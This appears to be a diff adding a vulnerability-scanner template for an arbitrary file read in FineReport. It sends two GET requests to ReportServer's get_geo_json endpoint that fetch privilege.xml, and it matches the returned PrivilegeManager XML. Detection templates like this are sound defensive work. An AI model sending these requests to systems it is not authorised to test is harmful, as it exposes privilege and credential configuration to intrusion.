@@ -1,0 +1,21 @@
+id: finereport-arbitrary-file-read
+info:
+  name: FineReport Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+      - "{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml"
+          - "</PrivilegeManager>"
+        part: body
